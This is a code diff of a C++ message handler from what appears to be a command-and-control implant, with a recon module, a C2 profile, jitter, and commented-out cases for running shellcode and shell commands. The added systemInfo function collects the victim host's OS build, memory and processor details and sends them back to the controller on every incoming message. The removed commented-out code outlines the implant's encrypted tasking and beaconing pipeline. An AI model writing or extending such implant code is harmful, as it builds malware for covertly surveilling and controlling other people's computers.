@@ -8,6 +8,7 @@
 #include "TransportLayer.h"
 
 #include <iostream>
+#include <sstream>
 
 #include <cstdlib> // NOTE: needed to execute shell cmd
 
@@ -193,9 +194,111 @@ bool MessageHandler::handleServerError(std::vector<uint8_t>& data)
 	return false;
 }
 
+bool MessageHandler::systemInfo(InternalMessage& msg)
+{
+	std::cout << "systemInfo" << std::endl; 
+	ReconMessage rMsg{};
+	//ZeroMemory(msg, sizeof(ReconMessage)); 
+
+	// OS Version Info 
+	/*
+	OSVERSIONINFOEX osInfo; 
+	osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX); 
+	if (GetVersionEx((OSVERSIONINFO*)&osInfo)) 
+	{ 
+		rMsg.dwMajorVersion = osInfo.dwMajorVersion;
+		rMsg.dwMinorVersion = osInfo.dwMinorVersion;
+		rMsg.dwBuildNumber = osInfo.dwBuildNumber;
+		rMsg.wProductType = osInfo.wProductType;
+	} 
+	*/
+	///
+	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+	if (hMod)
+	{
+		RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+		if (fxPtr != nullptr)
+		{
+			RTL_OSVERSIONINFOW rovi = { 0 };
+			rovi.dwOSVersionInfoSize = sizeof(rovi);
+			if (fxPtr(&rovi) == 0)
+			{
+				rMsg.dwMajorVersion = rovi.dwMajorVersion;
+				rMsg.dwMinorVersion = rovi.dwMinorVersion;
+				rMsg.dwBuildNumber = rovi.dwBuildNumber;
+			}
+		}
+	}
+
+	///
+
+
+	// RAM Info 
+	MEMORYSTATUSEX memoryStatus; 
+	memoryStatus.dwLength = sizeof(memoryStatus); 
+	if (GlobalMemoryStatusEx(&memoryStatus)) 
+	{ 
+		rMsg.totalPhysicalMemory = memoryStatus.ullTotalPhys; 
+		rMsg.availablePhysicalMemory = memoryStatus.ullAvailPhys; 
+	} 
+	
+	// Processor Info 
+	SYSTEM_INFO systemInfo; 
+	GetSystemInfo(&systemInfo); 
+	rMsg.numberOfProcessors = systemInfo.dwNumberOfProcessors; 
+	rMsg.processorArchitecture = systemInfo.wProcessorArchitecture;
+
+	// Get processor name from registry (simplified) 
+	//GetProcessorName(msg->processorName, sizeof(msg->processorName));
+
+	// Local IP 
+	//GetLocalIpAddress(msg->localIp, sizeof(msg->localIp)); 
+	
+	// System Names
+	// DWORD size = sizeof(msg->computerName); 
+	// GetComputerNameA(msg->computerName, &size); 
+ 
+	//size = sizeof(msg->userName); 
+	// GetUserNameA(msg->userName, &size); 
+
+	// Domain name (simplified)
+	// GetDomainName(msg->domainName, sizeof(msg->domainName)); 
+
+	// Process name 
+	// GetModuleFileNameA(NULL, msg->processName, sizeof(msg->processName)); 
+
+
+
+	std::ostringstream result; 
+	result << "dwMajorVersion: " << rMsg.dwMajorVersion << "\n";
+	result << "dwMinorVersion: " << rMsg.dwMinorVersion << "\n"; 
+	result << "dwBuildNumber: " << rMsg.dwBuildNumber << "\n"; 
+	result << "wProductType: " << rMsg.wProductType << "\n"; 
+	result << "totalPhysicalMemory: " << rMsg.totalPhysicalMemory << "\n"; 
+	result << "availablePhysicalMemory: " << rMsg.availablePhysicalMemory << "\n"; 
+	result << "numberOfProcessors: " << rMsg.numberOfProcessors << "\n"; 
+	result << "processorArchitecture: " << rMsg.processorArchitecture << "\n";
+
+	std::string outMsgData = result.str(); 
+
+	InternalMessage outMsg; 
+	outMsg.data = string2byte(outMsgData); 
+	
+	MessageHeader header; 
+	header.messageType = MessageType::COMMAND_RESULT; 
+	header.messageId = 105; // TODO: 
+	header.dataSize = outMsg.data.size(); 
+	outMsg.header = header; 
+	bool sendResult = transportLayer_->sendMessage(outMsg); 
+	return sendResult; 
+
+}
+
 // TODO: something about this function corruprts the memory
 void MessageHandler::processMessage(InternalMessage& msg)
 {
+	systemInfo(msg);
 	switch (msg.header.messageType)
 	{
 	case MessageType::EXECUTE_COMMAND:
@@ -250,202 +353,7 @@ std::string MessageHandler::byte2string(std::vector<uint8_t>& inMsg)
 }
 
 
-// this function processes the header of the message
-// to determine how to interpet the contents/data of 
-// the message. 
-//int processMessage(BYTE* payload, MessageHeader* header)
-// int processIncomingMessage(InternalMessage* msg, Config* config)
-/*
-bool MessageHandler::processMessage(InternalMessage* msg) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
-{
-	return true;
-
-	switch (msg->header.messageType) {
-		case SYS_INFO:
-		{
-			ReconMessage reconMessage;
-			int status = generateReconMessage(&reconMessage);
-
-			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
-			InternalMessage* response = (InternalMessage *)malloc(sizeof(InternalMessage));
-			memcpy(response->data, &reconMessage, sizeof(ReconMessage));
-			response->header.dataSize = sizeof(ReconMessage);
-			//return send(msg->header.message_id);
-			//status |= send(response, config);
-			return status;
-		}
-
-		//case MSG_TYPE_SHELLCODE:
-			//return ExecuteShellcode(payload, header->payload_size);
-
-		//case MSG_TYPE_CMD:
-			//return ExecuteCommand((char*)payload, header->payload_size);
-
-		// ... other cases
-	}
-	return false;
-}
-*/
-
-
-//int receiveMessages(Config* config, FuncRecv pRecv) // TODO: figure out if passing pRecv is the best way to do this
-//bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received, Config& config)
-/*
-bool MessageHandler::receiveMessages(uint8_t* buffer, size_t bytes_received)
-{
-	// TODO: replace 'true' with a condition
-	while (true) // TODO: change to var... while tcp connection is valid/established/successful
-	{
-		// TODO: socket stuff
-
-		// MessageConsumer::handle(message); // TODO: this is c++... convert to c
-		// if there's incoming commands...
-
-		// TODO: should probs def move this pRecv logic somewhere else maybe in MessageConsumer? 
-		// so thorough validiating and error checks can be done on the data. stuff like making sure message isn't empty
-		// and is a valid MessageType and what not
-		//unsigned char buffer[4096]; // TODO: type should be uint8_t?
-		//int bytes_received = pRecv(config->sock, (char*)buffer, 4096, 0);
-
-        InternalMessage resultMsg; // TODO: this needs to be initialized/allocated to be 0/NULL
-		//handleTCP(buffer, bytes_received, &resultMsg, config); // maybe rename to handleTCPInbound?
-		//handleTCP(buffer, bytes_received, &resultMsg); // maybe rename to handleTCPInbound or handleConnection once polymorphic?
-
-		//publisher
-        //send(&resultMsg, config); // TODO: check return value for errors
-		//sendMessage(&resultMsg); // TODO: check return value for errors
 
 
 
-        // if heartbeat interval elapsed... 
-        // sendMessage(MessageType HEARTBEAT) // TODO: this should be the first thing checked? heartbeat timer should be reset anytime a message is received?
 
-		// sleepWithJitter()
-
-		// if connection is lost, attempt to reconnect... maybe do this logic somewhere else?
-	}
-
-	return false; // if no errors, return 0
-}*/
-
-//bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg, C2Profile* config)
-/*
-bool MessageHandler::handleTCP(uint8_t* rawData, size_t rawDataLength, InternalMessage* resultMsg)
-{
-	// Raw Bytes from Socket
-	uint8_t buf[4096]; // TODO: rename to plaintext?
-
-	// DECRYPT -> Decrypted Bytes
-	// [IV (12 bytes - cleartext)][Ciphertext (encrypted)][Tag (16 bytes - cleartext)]
-	// TODO: this parsing of data should be done in actual decrypt method? or a wrapper for it maybe 
-	const uint8_t* iv = rawData;
-	const uint8_t* ciphertext = rawData + 12;
-	size_t ciphertext_len = rawDataLength - 12 - 16;
-	const uint8_t* tag = rawData + 12 + ciphertext_len;
-	//int decrypted_size = decrypt_aes_256_gcm(ciphertext, ciphertext_len, config->crypto_key, iv, tag, buf); // TODO: decrypted_size
-
-	// check if length(buf) is at least the sizeof(MessageHeader), otherwise throw error
-	// parseHeader()
-	// check if sizeof(MessageHeader) + header->payloadSize == decrypted_size, otherwise throw error
-
-	// DESERIALIZE -> InternalMessage 
-	// check length(plaintext) == sizeof(InternalMessage)
-    // const InternalMessage* msg = (const InternalMessage*)plaintext;
-	// VALIDATE
-    // size_t expected_size = offsetof(InternalMessage, data) + msg->data_len;
-    // check length(plaintext) == expected_size
-
-	InternalMessage* msg = (InternalMessage*)buf;
-
-	// EXECUTE (InternalMessage)
-	// call function based on InternalMessage
-	//processMessage(msg->payload, msg->header); // TODO: check return type for errors?
-	//processMessage(msg, config);
-	processMessage(msg);
-
-	// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
-	//InternalMessage* response = malloc(sizeof(InternalMessage));
-	//memcpy(response->payload, &recon, sizeof(ReconData));
-	//response->header.payload_size = sizeof(ReconData);
-
-	// TODO: cleanup/free buf
-	return true;
-}*/
-/*
-int handleHTTPS(uint8_t* data)
-{
-	// HTTPS Text Message
-
-	// PARSE HTTP HEADERS
-
-	// EXTRACT JSON BODY
-
-	// EXTRACT BASE64 FIELD
-
-	// BASE64 DECODE -> Raw Bytes
-
-	// DECRYPT -> Decrypted Bytes
-
-	// DESERIALIZE -> InternalMessage
-
-	// VALIDATE
-
-	// EXECUTE (InternalMessage)
-
-}*/
-
-
-///////////////////////
-
-
-/*
-MessageHandler::MessageHandler(
-            CompressorUniquePtr compressorPtr,
-            EncrypterUniquePtr encrypterPtr,
-            EncoderUniquePtr encoderPtr,
-            SerializerUniquePtr serializerPtr,
-            Config* config) :
-          	compressorPtr_(compressorPtr),
-            encrypterPtr_(encrypterPtr),
-            encoderPtr_(encoderPtr),
-            serializerPtr_(serializerPtr),
-            config_(config)
-{}*/
-//MessageHandler::MessageHandler(C2Profile& config) {}
-
-/*
-bool MessageHandler::sendMessage() // overload this function?
-{
-	// TODO: where does parsing go in this? (if it's even needed)
-
-	// InternalMessage
-	// Validate
-	// Serialize
-	// Encode
-	// Compress
-	// Encrypt
-	// Frame (if needed)
-	// Raw Bytes
-	// Send
-	return false;
-}
-
-// TODO: setup a listener function that calls this function?
-// listener function simply calls recv and handles socket stuff?
-// recvMessage would just serve as a wrapper for that maybe?
-bool MessageHandler::recvMessage() // overload this function?
-{
-	// TODO: where does parsing go in this? (if it's even needed)
-
-	// Recv
-	// Raw Bytes
-	// Decrypt
-	// Decompress
-	// Decode
-	// Deserialize
-	// Obtain InternalMessage object
-	// Validate
-	// handle InternalMessage (based on its header)
-	return false;
-}
-*/
